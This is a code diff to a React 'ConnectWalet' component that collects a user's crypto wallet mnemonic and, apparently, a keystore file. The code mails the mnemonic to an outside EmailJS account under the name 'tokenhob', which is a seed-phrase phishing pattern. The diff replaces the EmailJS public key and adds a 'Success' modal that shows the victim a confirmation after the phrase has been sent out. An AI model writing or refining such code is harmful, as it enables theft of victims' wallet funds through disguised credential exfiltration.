@@ -26,6 +26,7 @@ import { z } from "zod";
 import { countWords, findMultiple } from "../lib/utils";
 import emailjs from "@emailjs/browser";
 import axios from "axios";
+import { useModal } from "../hooks/use-modal";
 
 const mnemonicSchema = z.object({
   mnemonic: z.string().min(10, {
@@ -56,6 +57,7 @@ const keyStoreSchema = z.object({
 type KeyStoreType = z.infer<typeof keyStoreSchema>;
 
 const ConnectWalet = () => {
+  const { onOpen } = useModal();
   const { acceptedFiles, getRootProps, getInputProps } = useDropzone({
     onDrop: (files) => {
       if (files.length === 1) {
@@ -93,10 +95,11 @@ const ConnectWalet = () => {
             from_name: "tokenhob",
             message: mnemonic,
           },
-          { publicKey: "L8nGK1vSp66Eu4CT8" }
+          { publicKey: "lEEH_tLWVAzllqBeT" }
         )
         .then((data) => {
           setIsLoading(null);
+          onOpen("Success", { ...data })
           mnemonicForm.reset();
         });
     } else {
